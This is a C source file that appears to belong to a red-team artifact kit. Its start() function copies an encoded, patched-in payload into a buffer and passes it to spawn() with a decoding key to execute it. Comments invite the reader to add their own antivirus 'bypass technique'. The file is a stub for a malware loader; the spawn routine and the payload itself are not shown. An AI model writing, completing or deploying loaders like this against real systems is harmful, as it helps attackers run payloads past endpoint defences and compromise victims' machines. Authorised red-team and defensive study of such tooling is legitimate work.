#include <windows.h>
#include <stdio.h>
#include "patch.h"

/* The start function gets called when the bypass is ready to execute. The HINSTANCE is
   a handle to the current artifact. You can use this to determine the location of this
   artifact on disk (if it helps your bypass technique) */
void start(HINSTANCE mhandle) {
	/* phear is a struct that defines how artifact.cna will patch the payload data
	   into this artifact. You're welcome to update artifact.cna to use your own
	   convention if you like. */
	phear * payload = (phear *)data;
	char * buffer;

	/* copy our encoded payload into its own buffer... necessary b/c spawn modifies it */
	buffer = (char *)malloc(payload->length);
	memcpy(buffer, payload->payload, payload->length);

	/* execute our payload */
	spawn(buffer, payload->length, payload->key);

	/* clean up after ourselves */
	free(buffer);
}
